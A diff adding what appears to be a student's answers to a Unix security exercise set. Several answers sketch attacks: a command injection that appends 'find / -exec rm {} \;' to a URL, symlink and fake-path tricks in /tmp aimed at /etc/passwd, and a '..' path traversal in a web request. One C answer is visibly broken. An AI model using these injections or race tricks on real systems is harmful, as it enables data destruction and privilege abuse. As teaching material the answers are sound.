@@ -1,0 +1,70 @@
+1.
+http://cr.yp.to; find / -exec rm {} \;
+
+2.
+int main(void)
+{
+	symlink("/etc/passwd", "/tmp/new-configs");
+	return 0;
+}
+
+3.
+print-new-config > /root/new-configs
+[ -s /tmp/new-configs ] && ( mail root < /tmp/new-configs )
+rm /root/new-configs
+
+given that only root can write to /root/
+
+4.
+I'm considering a setuid program one which has the setuid bit set on with chmod.
+(A) comparing getuid with geteuid, if they differ the process is setuid.
+(B) using the function unsetenv to unset all the variables in **environ.
+
+5.
+int main(void)
+{
+	mkdir("/tmp/ ", S_IRUSR | S_IWUSR | S_IXUSR);
+	mkdir("/tmp/ /etc", S_IRUSR | S_IWUSR | S_IXUSR);
+	fopen("/tmp/ /etc/passwd .core", "w");
+	return 0;
+}
+
+6.
+/* for simplicity sake, let's assume inetd.conf is never bigger than this
+ * (unlikely anyways). */
+#define MAX_SIZE 1000000
+
+char old[MAX_SIZE];
+int main(void)
+{
+	int fd, t;
+
+	fd = open("/etc/inetd.conf", O_RDONLY);
+	if (fd == -1) return -1;
+	if (-1 == (t=read(fd, old, MAX_SIZE, 0))) return -1;
+	close(fd);
+	fd = open("/etc/inetd.conf",O_WRONLY);
+	if (fd == -1) return -1;
+	if (0 != write(fd,x,xlen)) {
+		lseek(fd, 0, 0);
+		write(fd,old,t);
+		close(fd);
+		return -1;
+	}
+	close(fd)
+	return 0;
+}
+
+7.
+Dunno.
+
+8.
+He can send the web page request:
+	http://hapless.edu/~root/any/path/he/wishes
+of course, the path can contain .. and all the rest of it.
+
+9.
+Dunno.
+
+10.
+Dunno.
